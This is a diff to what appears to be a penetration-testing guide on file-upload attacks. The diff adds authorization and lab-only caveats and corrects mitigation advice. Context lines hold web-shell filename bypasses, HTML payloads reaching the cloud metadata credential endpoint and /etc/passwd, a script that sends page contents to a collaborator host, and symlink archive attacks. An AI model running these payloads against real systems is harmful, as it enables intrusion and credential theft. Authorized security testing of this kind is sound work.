@@ -31,6 +31,8 @@ report_count: 5
 
 ## 9. FILE UPLOAD
 
+Use disposable test accounts and owner-controlled canaries only. Replace metadata/credential endpoints, sensitive local files, shell uploads and exfiltration callbacks below with harmless lab markers; do not retrieve real credentials or overwrite application/system files to prove impact. Successful network fetch, HTML script execution and upload acceptance are separate observations, not automatic RCE. Parser/version/security-policy behavior varies. Validate full decoded formats, generate storage names, reject traversal/symlinks and isolate uploaded content; extension or magic-byte checks alone are insufficient.
+
 ### Content-Type Bypass
 ```
 filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
@@ -43,7 +45,7 @@ filename=shell.phtml, shell.pHp, shell.php5   → extension variants
 |---|---|---|
 | Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
 | Null byte | `shell.php%00.jpg` | Sanitize null bytes |
-| Double extension | `shell.jpg.php` | Only allow single extension |
+| Double extension | `shell.jpg.php` | Allowlist the normalized final type; a single extension alone is not a security boundary |
 | MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
 | Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
 | Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
@@ -137,7 +139,7 @@ PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/se
 # Local file read
 PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'
 
-# JavaScript execution (if sandbox not enforced)
+# HTML JavaScript/network execution is not proof of host code execution
 PAYLOAD='<html><body><script>
 fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
 </script></body></html>'
@@ -163,7 +165,8 @@ ln -s /etc/passwd /tmp/sym_attack/innocent.txt
 zip -ry /tmp/symlink.zip /tmp/sym_attack/
 
 # TAR symlink attack
-tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/
+tar --create --file=/tmp/symlink.tar /tmp/sym_attack/
+# Without --dereference, tar preserves the symlink; use only a harmless lab target.
 
 # Test: upload to any /import, /extract, /unzip endpoint
 curl -s -X POST "https://$TARGET/api/import" \
@@ -189,7 +192,7 @@ curl -s -X POST "https://$TARGET/api/import" \
 ## Limitations
 
 - Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
-- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
+- Docs-only import: upstream helpers are not bundled. Do not install a guessed package such as evilarc from a registry; review a fixed source, license and dependencies before any authorized lab setup.
 - Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.
 
 ### Example
